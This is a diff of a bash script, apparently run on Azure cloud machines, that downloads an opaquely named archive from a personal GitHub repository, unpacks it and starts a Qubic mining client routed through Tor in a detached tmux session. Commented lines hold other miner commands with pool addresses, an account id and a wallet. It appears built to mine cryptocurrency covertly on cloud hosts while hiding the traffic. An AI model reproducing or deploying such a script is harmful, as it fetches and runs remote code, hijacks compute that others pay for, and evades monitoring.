@@ -1,9 +1,13 @@
 #!/bin/bash
 #cd /home/azureuser
+mkdir /home/azureuser/qub_dir
+cd /home/azureuser/qub_dir
+
 #wget https://github.com/apool-io/apoolminer/releases/download/v2.1.0/apoolminer_linux_v2.1.0.tar -P /home/azureuser
 #tar -xf apoolminer_linux_v2.1.0.tar
-#wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /home/azureuser
-#tar -xf qubic.tar.gz
+
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /home/azureuser/qub_dir
+tar -xf /home/azureuser/qub_dir/qubic.tar.gz
 
 
 sudo systemctl start tor
@@ -13,8 +17,8 @@ sudo systemctl start tor
 if ip add | grep -q tun; then
     echo "Интерфейс tun присутствует"
     sudo systemctl start tor
-    tmux new -ds servak torify ./apoolminer --account CP_7xv4nh7sn3 --gpu-off --pool qubic1.hk.apool.io:3334 --thread 2
-    #tmux new -ds servak torify ./qli-Client
+    #tmux new -ds servak torify ./apoolminer --account CP_7xv4nh7sn3 --gpu-off --pool qubic1.hk.apool.io:3334 --thread 2
+    tmux new -ds servak torify /home/azureuser/qub_dir/qli-Client
     #tmux new -ds servak torify ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RAyRmryhKwqVu1XphEMa7GcsHet4uP3F9h.AUTOTUNE
 else
     echo "Интерфейс tun отсутствует"
